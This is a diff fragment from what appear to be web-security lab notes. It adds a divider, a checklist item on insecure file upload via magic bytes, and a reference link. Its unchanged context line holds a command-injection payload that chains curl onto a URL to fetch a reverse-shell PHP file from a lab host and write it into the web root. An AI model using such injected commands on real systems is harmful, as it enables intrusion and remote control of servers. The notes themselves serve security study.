@@ -242,7 +242,12 @@ Command: https://tcm-sec.com && curl 192.168.17.133:8080/rev.php > /var/www/html
 ```
 
 
+<hr>
+
+
 - [ ] Insecure File Upload - Basic | Magic Bytes
+
+https://appsecexplained.gitbook.io/appsecexplained/common-vulns/insecure-file-upload
 
 
 
